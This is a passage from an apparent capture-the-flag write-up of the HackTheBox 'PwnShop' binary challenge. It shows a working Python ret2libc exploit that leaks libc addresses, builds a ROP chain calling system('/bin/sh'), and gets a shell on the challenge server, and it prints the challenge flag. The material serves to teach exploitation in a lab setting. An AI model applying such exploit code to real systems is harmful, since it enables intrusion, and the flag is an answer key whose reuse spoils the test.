<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> setvbuf
   442: 0000000000084ce0   583 FUNC    GLOBAL DEFAULT   15 _IO_<span class="code-red">setvbuf</span>@@GLIBC_2.2.5  
  1988: 0000000000084ce0   583 FUNC    WEAK   DEFAULT   15 <span class="code-red">setvbuf</span>@@GLIBC_2.2.5
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked setvbuf() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">setvbuf_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">setvbuf_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">84ce0</span>

<span class="mtk1">    </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">setvbuf_offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1288432  
[<span class="code-blue">*</span>] Leaked details_global address: 0x561736fb40c0
[<span class="code-green">+</span>] ELF base address: 0x561736fb0000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f934a07bce0
[<span class="code-green">+</span>] Glibc base address: 0x7f9349ff7000
[<span class="code-blue">*</span>] Switching to interactive mode
Sorry, we aren't selling right now.
But you can place a request.
Enter details: <span class="code-red">$</span>
</code></pre></div><p>There it is. Again, we can verify that the base address ends in <code>000</code> in hexadecimal.</p><p>Let&rsquo;s take all the offsets needed to continue with a Ret2Libc attack (notice that we are solving the challenge locally):</p><ul><li>Offset of <code>system</code> (<code>0x52290</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 0000000000153ae0   103 FUNC    GLOBAL DEFAULT   15 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><ul><li>Offset of <code>"/bin/sh"</code> (<code>0x1b45bd</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh  
 1b45bd <span class="code-red">/bin/sh</span>
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>Then, we can compute the real addresses of <code>system</code> and <code>"/bin/sh"</code> at runtime and finish the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">setvbuf_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">84ce0</span>
<span class="mtk1">    </span><span class="mtk1">system_offset</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">52290</span>
<span class="mtk1">    </span><span class="mtk1">bin_sh_offset</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1b45bd</span>

<span class="mtk1">    </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">setvbuf_offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">system_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">system_offset</span>
<span class="mtk1">    </span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">bin_sh_offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">5</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">system_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Notice the use of <code>pop_rdi_ret + 1</code> as a <code>ret</code> gadget to prevent stack alignment issue before calling <code>system</code>. Now the exploit works locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1299852  
[<span class="code-blue">*</span>] Leaked details_global address: 0x55b12e8b30c0
[<span class="code-green">+</span>] ELF base address: 0x55b12e8af000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f03d716ace0
[<span class="code-green">+</span>] Glibc base address: 0x7f03d70e6000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
pwnshop  solve.py
</code></pre></div><p>Nice, let&rsquo;s run it in the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.111.164:30819
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 134.122.111.164 on port 30819: Done  
[<span class="code-blue">*</span>] Leaked details_global address: 0x5569018770c0
[<span class="code-green">+</span>] ELF base address: 0x556901873000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f270d5cae80
[<span class="code-green">+</span>] Glibc base address: 0x7f270d5461a0
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>We don&rsquo;t get a shell because the remote instance has a different Glibc version. One way of getting it is searching for the last three hexadecimal digits of an address leak (for instance, <code>setvbuf</code>) in a website like <a href="https://libc.rip">libc.rip</a>. We find some matching Glibc versions and the offsets of useful functions:</p><p><img src="/images/HTB-Challenges/HTB-Pwn-PwnShop-1.png" alt="Glibc search"></p><p>Fortunately, the one that matches with the remote instance is the first one.</p><h2 id="flag">Flag</h2><p>After changing the offset values in the exploit, we will finally get a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.111.164:30819
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 134.122.111.164 on port 30819: Done  
[<span class="code-blue">*</span>] Leaked details_global address: 0x563c175640c0
[<span class="code-green">+</span>] ELF base address: 0x563c17560000
[<span class="code-blue">*</span>] Leaked strcmp() address: 0x7fdd05ae3e80
[<span class="code-green">+</span>] Glibc base address: 0x7fdd05a74000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
core
flag.txt
pwnshop
<span class="code-red">$</span> cat flag.txt
HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/PwnShop/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#crafting-the-rop-chain">Crafting the ROP chain</a></li><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>